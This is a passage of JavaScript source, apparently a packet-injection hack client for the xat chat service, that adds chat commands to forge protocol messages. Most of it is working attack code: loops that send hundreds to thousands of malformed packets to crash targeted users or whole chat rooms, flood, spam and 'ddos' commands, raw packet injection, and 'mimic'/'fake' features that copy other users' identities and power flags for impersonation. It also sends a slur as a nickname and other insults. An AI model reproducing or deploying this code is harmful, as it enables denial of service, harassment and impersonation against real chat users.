    var cmd = message.shift().substr(1).toLowerCase();
    var msg = message.join(" ");

    function killUser() {
        if (crashEnable == true) {
            for (counter = 1; counter < 650; counter++) {
                fakeSend('<z d="' + xatIDs.join(' ') + '" u="' + packet.u + '" t="/l" o="6666,p1pwn*' + crashCol + '," />');
                fakeSend('<z d="' + xatIDs.join(' ') + '" u="' + packet.u + '" t="/l" o="6666,p1pwn*' + crashCol2 + '," />');
            }
        }
    }

    function killChat() {
        if (crashEnable == true) {
            for (counter = 1; counter < 650; counter++) {
                fakeSend('<m t="" o="6666,p1pwn*' + crashCol + '," u="' + packet.u + '" />');
                fakeSend('<m t="" o="6666,p1pwn*' + crashCol2 + '," u="' + packet.u + '" />');
                crashCol += 1
                crashCol2 += 1
            }
        }
    }

    function Flood() {
        for (counter = 1; counter < 5; counter++) {
            usersOnline.forEach(function(id) {
                fakeSend('<c u="' + id + '" t="' + msg + '" s="1" />');
            })
            return doc.documentElement.remove();
        }
    }

    function getRandomColor() {
        var letters = '0123456789ABCDEF';
        var color = '#';
        for (var i = 0; i < 6; i++) {
            color += letters[Math.floor(Math.random() * 16)];
        }
        return color;
    }

    if (cmd == 'coolname') {
        var last = true;
        var lastColor = "#ffffff#000001";
        var lastNick = nickBackup;
        setInterval(function() {
            let randomColor = getRandomColor() + getRandomColor();
            let toReplace = lastNick.replace(lastColor, randomColor);
            fakeSend('<bs n="' + toReplace + '" u="' + userID + '" />');
            lastColor = randomColor;
            lastNick = toReplace;
        }, 11000);
    }

    if (cmd == 'color' && message[0] == "red") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#Er");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    else if (cmd == 'color' && message[0] == "blue") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#Eb");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    else if (cmd == 'color' && message[0] == "green") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#E");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    else if (cmd == 'color' && message[0] == "yellow") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#Eg");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    else if (cmd == 'color' && message[0] == "purple") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#Ep");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    else if (cmd == 'color' && message[0] == "pink") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#Ek");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    else if (cmd == 'color' && message[0] == "sky") {
        var lastName = nickBackup;
        let toReplace = lastName.replace("hat#Eg", "hat#Ev");
        fakeSend('<bs n="' + toReplace + '##disable " a="' + avatarBackup + ' " u="6666" />');
        lastName = toReplace;
    }

    if (cmd == 'flood') {
        fakeRecv('<c u="' + id + '" d="' + userID + '" t="Now flooding the chat" s="1" />');
        for (counter4 = 1; counter4 < 5; counter4++) {
            let timerId = setInterval(() => Flood(), 500);
        }
    }

    if (cmd == 'online') {
        selfMsg('Users online: ' + usersOnline.join(' '));
    }

    if (cmd == 'masha') {
        mashaEnabled = true;
        selfMsg('Masha is enabled.');
    }

    if (cmd == 'mamall') {
        mammonAll = true;
        selfMsg('Everyone is now me.');
    }

    if (cmd == 'wpe' && message[0] == "send") {
		msg = msg.replace("❮", "<");
		msg = msg.replaceAll("”", "\x22");
		msg = msg.replaceAll("❯", ">");
        fakeSend('' + msg.substring(msg.indexOf(" ") + 1) + '');
	}

    if (cmd == 'wpe' && message[0] == "spam") {
    	let i = 0;
		message[1]++
		const arr = msg;
		const item = message[3];
		const index = arr.indexOf(item);
		setInterval(function () {
		i++;
		if (i < message[1]) {
		msg = msg.replace("❮", "<");
		msg = msg.replaceAll("”", "\x22");
		msg = msg.replaceAll("❯", ">");
    	fakeSend('' + msg.slice(index) + '');
		selfMsg('Packet ' + i + ' sent out of ' + (message[1] - 1) + ' total with ' + message[2] + ' millisecond(s). duration.');
		}
		}, message[2]);
		}

    if (cmd == 'wpe' && message[0] == "spamrecv") {
    	let i = 0;
		message[1]++
		const arr = msg;
		const item = message[3];
		const index = arr.indexOf(item);
		setInterval(function () {
		i++;
		if (i < message[1]) {
		msg = msg.replace("❮", "<");
		msg = msg.replaceAll("”", "\x22");
		msg = msg.replaceAll("❯", ">");
    	fakeRecv('' + msg.slice(index) + '');
		selfMsg('Packet ' + i + ' received out of ' + (message[1] - 1) + ' total with ' + message[2] + ' millisecond(s). duration.');
		}
		}, message[2]);
		}
    
    if (cmd == 'wpe' && message[0] == "recv") {
		msg = msg.replace("❮", "<");
		msg = msg.replaceAll("”", "\x22");
		msg = msg.replaceAll("❯", ">");
        fakeRecv('' + msg.substring(msg.indexOf(" ") + 1) + '');
	}

    if (cmd == 'afk') {
		
		fakeSend('<bs n="[AFK] ' + nickBackup + '##disable " a="' + avatarBackup + ' " u="6666" />');
        afkEnabled = true;
        afkMsg.push("*I thought what I\'d do was, I\'d pretend I was one of those deaf mutes.*  (o) **[AFK] (okp) [MESSAGE DELIVERED]**");
        selfMsg('Your afk has been set.');
    }

    if (cmd == 'vip' && message[0] == "on") {
        vipEnabled = true;
        selfMsg('Verify status is enabled when copying user.');
    }

    else if (cmd == 'vip' && message[0] == "off") {
        vipEnabled = false;
        selfMsg('Verify status is disabled when copying user.');
    }
	
    if (cmd == 'name') {
        fakeSend('<bs n="Retard" a="" h="" u="6666" />');
    }

    if (cmd == 'ddos') {
        fakeSend('<y r="5" v="0" u="6666" z="8335799305056508195"/>');
    }

    if (cmd == 'mike') {
        selfMsg('You are now Mike. (Your default look.)');
        fakeSend('<bs n="Mike(hat#EvhC)(glow#666666#cfcfcf)##I_thought_what_I’d_do_was,_I’d_pretend_I_was_𝗼𝗻𝗲_𝗼𝗳_𝘁𝗵𝗼𝘀𝗲_𝗱𝗲𝗮𝗳-𝗺𝘂𝘁𝗲𝘀.#666666#cfcfcf##eyJlZmZlY3QiOiJzY3JvbGxsZWZ0Iiwic3BlZWQiOjUsInN0YXR1czIiOiIiLCJ3YXZlRnJlcXVlbmN5Ijo2fQ==##enable##disable" a="hhttps://img.xatblog.net/image/5YgeEh0RmF.png#https://img.xatblog.net/image/sShYPU6OrgJ.png" u="6666" />');
    }

    if (cmd == 'lucifer') {
        selfMsg('You are now Lucifer of Pride.');
        fakeSend('<bs n="Lucifer(hat#Er)(glow#dc143c#cfcfcf)##Lucifer of Pride#dc143c#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/QRGZdGS9cV.png" u="6666" />');
    }

    if (cmd == 'leviathan') {
        selfMsg('You are now Leviathan of Envy.');
        fakeSend('<bs n="Leviathan(hat#E)(glow#10a012#cfcfcf)##Leviathan of Envy#10a012#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/3xSIIKT1FG.png" u="6666" />');
    }
	

    if (cmd == 'satan') {
        selfMsg('You are now Satan of Wrath.');
        fakeSend('<bs n="Satan(hat#Ep)(glow#800080#cfcfcf)##Satan of Wrath#800080#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/HsQ6H6QuPw9.png" u="6666" />');
    }

    if (cmd == 'belphegor') {
        selfMsg('You are now Belphegor of Sloth.');
        fakeSend('<bs n="Belphegor(hat#Eb)(glow#000080#cfcfcf)##Belphegor of Sloth#000080#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/OyGOK1aFQ.png" u="6666" />');
    }

    if (cmd == 'mammon') {
        selfMsg('You are now Mammon of Greed.');
        fakeSend('<bs n="Mammon(hat#Eg)(glow#92783c#cfcfcf)##Mammon of Greed#92783c#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/wZjmLhcGUP.png" u="6666" />');
    }

    if (cmd == 'beelzebub') {
        selfMsg('You are now Beelzebub of Gluttony.');
        fakeSend('<bs n="Beelzebub(hat#Ev)(glow#5ab9ed#cfcfcf)##Beelzebub of Gluttony#5ab9ed#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/A2DXYOju5tn.png" u="6666" />');
    }

    if (cmd == 'asmodeus') {
        selfMsg('You are now Asmodeus of Lust.');
        fakeSend('<bs n="Asmodeus(hat#Ek)(glow#ff69b4#cfcfcf)##Asmodeus of Lust#ff69b4#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/qndDKwHjJEd.png" u="6666" />');
    }

    if (cmd == 'erika') {
        selfMsg('You are now Erika Furudo.');
        fakeSend('<bs n="Erika(hat#Eb)(glow#1e1d37#798dd8)##The Great Detective#1e1d37#798dd8##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/qPgA4ygwY7j.png" u="6666" />');
    }

    if (cmd == 'frill') {
        selfMsg('You are now Frill.');
        fakeSend('<bs n="Frill(hat#Er)(glow#666666#cfcfcf)##My name is Frill#666666#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/6dwrygKOb.png" u="6666" />');
    }

    if (cmd == 'minerva') {
        selfMsg('You are now Minerva.. (how creepy..)');
        fakeSend('<bs n="Minerva(hat#Eg)(glow#92783c#cfcfcf)##The Mink#92783c#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/p5EwDv3S0d6.png" u="6666" />');
    }

    if (cmd == 'gaap') {
        selfMsg('You are now Gaap.');
        fakeSend('<bs n="Gaap(hat#Er)##The 33rd Ranked Demon##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable" a="https://img.xatblog.net/image/PKhKyme5PIv.png" u="6666" />');
    }

    if (cmd == 'xsendall') {
        usersOnline.forEach(async function(id) {
            fakeSend('<c u="' + id + '" t="' + msg + '" s="1" />');
        })
    }
	
    if (cmd == 'fake' && message[0] == "add") {
		fakeID2.pop();
        fakeID2.push(message[1].toString());
        selfMsg('ID ' + message[1] + ' is now added to fake list.');
    }
	
    if (cmd == 'fake' && message[0] == "summon") {
		fakeRecv('<u cb="1625121314" f="33" p0="1476393982" p1="2147483647" p2="4294836182" p3="4294967295" p4="2147483647" p5="2147479551" p6="2147352575" p7="2147483647" p8="2147418111" p9="2147483647" p10="2147483647" p11="2147483639" p12="2147483583" p13="2147483647" p14="2080374783" p15="2045640703" p16="1608499071" p17="1069547519" p18="2130702079" p19="2097151" po="2|3|5|7|8|10=2|12=2|18|19|20|22|23|26|33=2|36=2|37|38|39|44|47|49|51|54|58|59|60=17|65|68|69|71|74=2|75|78=68|80|82|84|85|89|91=5|92=15|96|112|114=3|115|117|118|120=2|125|126=3|138|139|141|143|145|146|147|150=2|155|160|161|163|164|167|197|201|205|209|214|215|216|222|224|225|226|228|229|252|302|310|314|336|346|349=2|423|613|618=2|623=3|" u="' + fakeID2 + '" d0="151002176" d2="6666" q="2" N="Mimic" n="' + utf8Encode(reflectName) + '" a="' + copyAvatar + '" h="" v="0" />');
    }

    if (cmd == 'fake' && message[0] == "talk") {
        fakeRecv('<c u="' + fakeID2 + '" d="' + userID + '" t="' + msg.substring(msg.indexOf(" ") + 1)  + '" s="1" />');
    }
	
    if (cmd == 'fake' && message[0] == "pc") {
        fakeRecv('<p u="' + fakeID2 + '" d="' + userID + '" t="' + msg.substring(msg.indexOf(" ") + 1) + '" s="2" />');
    }

    if (cmd == 'fake' && message[0] == "pm") {
        fakeRecv('<p u="' + fakeID2 + '" d="' + userID + '" t="' + msg.substring(msg.indexOf(" ") + 1) + '" s="1" />');
    }	

    if (cmd == 'todo') {
        fakeRecv('<aa b="PGRpdiBzdHlsZT0iZm9udC1mYW1pbHk6SGVsdmV0aWNhO2ZvbnQtc2l6ZToxMnB4Ij48Y2VudGVyPjxwIHN0eWxlPSJtYXJnaW46IDBweCAwIDZweCAwOztsZXR0ZXItc3BhY2luZzoxcHg7Zm9udC1zaXplOjE2cHg7Ij5MaXN0IG9mIHRoaW5ncyB0byBkbzo8L3A+PGRpdiBzdHlsZT0ibWFyZ2luOiA1cHggMCAwIDA7IHdpZHRoOjI1MHB4Ij48cD5GaXggdGhlIGludmlzaWJsZSBnbGl0Y2ggZm9yIG15IGVuZCB0aGF0IG1ha2VzIEVQIHNob3cgaW5zdGVhZCBvZiB0aGUgY29weSBwb3dlcnMuPC9wPjxwPkZpZ3VyZSBvdXQgaG93IHRvIGNhbGwgdmFsdWVzIGxpa2UgaW4gYSBkYXRhYmFzZSB3aXRoIHRoZSBbMF0gc3R1ZmYgZm9yIGlkLCByZWduYW1lLCBldGMuIDxwPkxlYXJuIGphdmFzY3JpcHQhPHAgc3R5bGU9Im1hcmdpbi1ib3R0b206IDIwcHg7Ij48L3A+PC9kaXY+PGRpdiBzdHlsZT0ibWFyZ2luLXRvcDotOHB4OyI+PGEgaHJlZj0iIyIgIHN0eWxlPSJwYWRkaW5nOjRweCAxNHB4O2JhY2tncm91bmQtY29sb3I6IzU1NTtib3JkZXItcmFkaXVzOjRweDtjb2xvcjojZmZmO3RleHQtZGVjb3JhdGlvbjpub25lIj5Pa2F5PC9hPjwvZGl2PjxwIHN0eWxlPSJjb2xvcjojYmZiZmJmO2ZvbnQtc2l6ZToxM3B4O21hcmdpbi10b3A6MTBweDsiPlNlbnQgYnk6IE1hbW1vbiBvZiBHcmVlZDwvcD48L2NlbnRlcj48L2Rpdj4=" />');
        selfMsg('Have you got these done yet?');
    }

    if (cmd == 'gaap') {
        fakeRecv('<u cb="1625121314" f="33" ' + gaapL + ' />');
        fakeRecv('<p u="' + gaap_id + '" d="' + userID + '" t="Gaap here, at your service!" />');
    }

    if (cmd == 'talk') {
        fakeRecv('<c u="' + id + '" d="' + userID + '" t="' + msg + '" s="1" />');
    }

    if (cmd == 'commands') {
        fakeRecv('<p u="' + id + '" d="' + userID + '" t="~crash~, ~crashpc~, ~crashc~, send *(debugging)*, insult *(?insult user)*, app *(?app 30000)*, spam *(debugging)*, boton (talk as bot), invison (talk invisible with italics), iton (italics for main chat), itonpc (italic for pc), summon (?summon id)" />');
    }

    function killDebug() {
        if (crashEnable == true) {
            for (counter = 1; counter < 35000; counter++) {
                fakeSend('<m t="" u="6666"/>');
            }
        }
    }

    if (cmd == 'kill' && message[0] == "debug") {
        fakeRecv('<c u="' + id + '" d="' + userID + '" t="Now debug killing chat.." s="1" />');
        crashEnable = true;
        for (counter = 1; counter < 5; counter++) {
            let timerId = setInterval(() => killDebug(), 0);
        }
    }

    if (cmd == 'kill' && message[0] == "user") {
        fakeRecv('<c u="' + id + '" d="' + userID + '" t="Now killing target.. ' + xatIDs.join(' ') + '" s="1" />');
        crashEnable = true;
        for (counter3 = 1; counter3 < 5; counter3++) {
            let timerId = setInterval(() => killUser(), 500);
            crashCol += 1
            crashCol2 += 1
        }
    }

    if (cmd == 'kill' && message[0] == "chat") {
        fakeRecv('<c u="' + id + '" d="' + userID + '" t="Now killing chat.." s="1" />');
        crashEnable = true;
        for (counter4 = 1; counter4 < 5; counter4++) {
            let timerId = setInterval(() => killChat(), 500);
            crashCol += 1
            crashCol2 += 1
        }
    }

    if (cmd == 'kill' && message[0] == "off") {
        crashEnable = false;
        selfMsg('Killer is disabled');
    }

    if (cmd == 'send') {
        fakeSend('<aa b="RnVjayBZb3Uu" />')
    }

    if (cmd == 'insult') {
        selfMsg('' + msg + ' is a big pile of **' + randomItem + '**');
    }

    if (cmd == 'app') {
        fakeSend('<x u="' + userID + '" i="' + message + '" t=""/>');
        fakeRecv('<x u="' + userID + '" i="' + message + '" t=""/>');
    }

    if (cmd == 'copy') {
        Copy = true;
        selfMsg('Copy user is now enabled.');
    }

    if (cmd == 'copyoff') {
        Copy = false;
        selfMsg('Copy user is now disabled.');
    }

    if (cmd == 'invis' && message[0] == "on") {
        isEnabled = true;
		invisFlag = true;

 copyp0 = [];
 copyp1 = [];
 copyp2 = [];
 copyp3 = [];
 copyp4 = [];
 copyp5 = [];
 copyp6 = [];
 copyp7 = [];
 copyp8 = [];
 copyp9 = [];
 copyp10 = [];
 copyp11 = [];
 copyp12 = [];
 copyp13 = [];
 copyp14 = [];
 copyp15 = [];
 copyp16 = [];
 copyp17 = [];
 copyp18 = [];
 copyp19 = [];
 copyp20 = [];
 copyp21 = [];
 copyp22 = [];
 copyp23 = [];

	copyp0.push(backupp0);
	copyp1.push(backupp1);
	copyp2.push(backupp2);
	copyp3.push(backupp3);
	copyp4.push(backupp4);
	copyp5.push(backupp5);
	copyp6.push(backupp6);
	copyp7.push(backupp7);
	copyp8.push(backupp8);
	copyp9.push(backupp9);
	copyp10.push(backupp10);
	copyp11.push(backupp11);
	copyp12.push(backupp12);
	copyp13.push(backupp13);
	copyp14.push(backupp14);
	copyp15.push(backupp15);
	copyp16.push(backupp16);
	copyp17.push(backupp17);
	copyp18.push(backupp18);
	copyp19.push(backupp19);
	copyp20.push(backupp20);
	copyp21.push(backupp21);
	copyp22.push(backupp22);
	copyp23.push(backupp23);

        selfMsg('Invisible Talker is now ON');
		fakeSend('<C/>');
    }

    if (cmd == 'invis' && message[0] == "off") {
        isEnabled = false;
        selfMsg('Invisible Talker is now OFF');
    }

    if (cmd == 'bot' && message[0] == "on") {
        isEnabled2 = true;
        selfMsg('Bot Talker is now ON');
    }

    if (cmd == 'bot' && message[0] == "off") {
        isEnabled2 = false;
        selfMsg('Bot Talker is now OFF');
    }

    if (cmd == 'it' && message[0] == "on") {
        isEnabled3 = true;
        selfMsg('Italics are now ON');
    }

    if (cmd == 'itonpc') {
        isEnabled4 = true;
        selfMsg('Italics are now ON for PC');
    }

    if (cmd == 'it' && message[0] == "off") {
        isEnabled3 = false;
        selfMsg('Italics are now OFF');
    }

    if (cmd == 'itoffpc') {
        isEnabled4 = false;
        selfMsg('Italics are now OFF for PC');
    }

    if (cmd == 'off') {
        isEnabled = false;
        selfMsg('Reaction list disabled');
    }

    if (cmd == 'add') {
        xatIDs.push(message.toString());
        selfMsg('ID ' + message + ' is now added');
    }

    if (cmd == 'userinfo') {

		const item = msg;
 
		const index = usersRegister.indexOf(item);
 
		if (index !== -1) {
    		selfMsg('' + usersRegister[index] + ' (' + usersID[index] + ')');
			selfMsg('Avatar: ' + usersAvatar[index] + '');
			selfMsg('Homepage: ' + usersHomepage[index] + '');
		}
			else {
			selfMsg('The user does not exist.');
		}
    }

		if (cmd == 'mimic' && message[0] == "crosschat") {
		clearMasks();
        copyEnabled = true;
		copyFlag = true;
        fakeSend('<z d="' + message[1] +'" u="6666_0" t="/l"/>');
    }	

	    if (cmd == 'mimic' && message[0] != "crosschat" && message[0] != "offline") {
		const item = msg;
		const index = usersRegister.indexOf(item);
 
		if (index !== -1) {
	clearMasks();
	copyRegname.push(usersRegister[index]);
	copyName.push(usersName[index]);
    copyAvatar.push(usersAvatar[index]);
    copyHomepage.push("");
    copyUserno.push(usersID[index]);
	copyv.push(usersv[index]);
	copyd2.push(usersd2[index]);
    copyp0.push(usersp0[index]);
    copyp1.push(usersp1[index]);
    copyp2.push(usersp2[index]);
    copyp3.push(usersp3[index]);
    copyp4.push(usersp4[index]);
    copyp5.push(usersp5[index]);
    copyp6.push(usersp6[index]);
    copyp7.push(usersp7[index]);
    copyp8.push(usersp8[index]);
    copyp9.push(usersp9[index]);
    copyp10.push(usersp10[index]);
    copyp11.push(usersp11[index]);
    copyp12.push(usersp12[index]);
    copyp13.push(usersp13[index]);
    copyp14.push(usersp14[index]);
    copyp15.push(usersp15[index]);
    copyp16.push(usersp16[index]);
    copyp17.push(usersp17[index]);
    copyp18.push(usersp18[index]);
    copyp19.push(usersp19[index]);
    copyp20.push(usersp20[index]);
    copyp21.push(usersp21[index]);
    copyp22.push(usersp22[index]);
    copyp23.push(usersp23[index]);
	copyEnabled = true;
	copyFlag2 = true;
    selfMsg('Now mimicking ' + copyRegname + ' (' + copyUserno + ')');
	fakeSend('<C/>');
		}
			else {
			selfMsg('The user does not exist.');
		}
    }

	    if (cmd == 'mimic' && message[0] == "offline") {
		const item = message[1];
		const index = usersRegister.indexOf(item);
 
		if (index !== -1) {
	clearMasks();
	copyRegname.push(usersRegister[index]);
	copyName.push(usersName[index]);
    copyAvatar.push(usersAvatar[index]);
    copyHomepage.push("");
    copyUserno.push(usersID[index]);
	copyv.push(usersv[index]);
    selfMsg('Now offline mimicking ' + copyRegname + ' (' + copyUserno + ')');
	fakeSend('<bs n="' + copyName + '" a="' + copyAvatar + '" h="' + copyHomepage + '" u="6666" />');
		}
			else {
			selfMsg('The user does not exist.');
		}
    }

    if (cmd == 'status') {
        xatIDs.push(message.toString());
        selfMsg('IDs: ' + xatIDs.join(' ') + '. Status: ' + isEnabled + '.');
    }

    if (cmd == 'clear') {
        xatIDs = [];
        selfMsg('Reaction IDs cleared');
    }

	if (cmd == 'mimicdb' && message[0] == "kotori") {
	clearMasks();
	copyRegname.push("mirajeketa2");
	copyName.push("(whirlfx#w799#fd6b82)𝘒𝘰𝘵𝘰𝘳𝘪(tickle#snows#fd6b82)𝘐𝘵𝘴𝘶𝘬𝘢冬(glow#FD6B82#ffffff)(hat#r#FD6B82)##Listening to ANiME Music!#FD6B82######enable");
    copyAvatar.push("https://img.xatblog.net/image/675w1PWr.png");
    copyHomepage.push();
    copyUserno.push(1534810877);
	copyv.push();
	copyd2.push();
    copyp0.push(1076752914);
    copyp1.push(20971520);
    copyp2.push(131080);
    copyp3.push(128);
    copyp4.push();
    copyp5.push(134217728);
    copyp6.push();
    copyp7.push(128);
    copyp8.push();
    copyp9.push();
    copyp10.push(536870912);
    copyp11.push();
    copyp12.push();
    copyp13.push();
    copyp14.push();
    copyp15.push();
    copyp16.push();
    copyp17.push();
    copyp18.push();
    copyp19.push();
    copyp20.push();
    copyp21.push();
    copyp22.push();
    copyp23.push();
	copyEnabled = true;
	copyFlag2 = true;
    selfMsg('Now mimicking ' + copyRegname + ' (' + copyUserno + ')');
	fakeSend('<C/>');
	}

function clearMasks() {
 copyRegname = [];
 copyName = [];
 copyAvatar = [];
 copyHomepage = [];
 copyv = [];
 copyd2 = [];
 copyUserno = [];
 copyp0 = [];
 copyp1 = [];
 copyp2 = [];
 copyp3 = [];
 copyp4 = [];
 copyp5 = [];
 copyp6 = [];
 copyp7 = [];
 copyp8 = [];
 copyp9 = [];
 copyp10 = [];
 copyp11 = [];
 copyp12 = [];
 copyp13 = [];
 copyp14 = [];
 copyp15 = [];
 copyp16 = [];
 copyp17 = [];
 copyp18 = [];
 copyp19 = [];
 copyp20 = [];
 copyp21 = [];
 copyp22 = [];
 copyp23 = [];
}

    return doc.documentElement.remove(); // this will prevent the message be shown for others

});

registerHook("p", function(packet, direction, doc, send) {

    if (direction == "toxat" && packet.d == fakeID) {
        doc.documentElement.attributes.d.value = "6666";
    }

    if (direction == "fromxat" && afkEnabled == true && afkSent2 == "") {
        fakeSend('<p u="' + packet.u + '" t="' + afkMsg + '" s="2" d="' + userID + '" />');
        afkSent2.push(packet.u.toString());
    }

    if (packet.d == "6666") {
        doc.documentElement.removeAttribute('o'); // remove reactions for my messages
    }

    if (direction == "fromxat") return;

});

// Keep user online
setInterval(function () {
    fakeSend('<p u="1521205685" t="Keep logged in" s="2" d="' + userID + '" />'); // xLaming's reg ID    
}, 240000); // each 240 seconds


registerHook("c", function(packet, direction, doc, send) {

 if (direction == "toxat" && packet.t.includes("K2")) {
doc.documentElement.remove();
}

});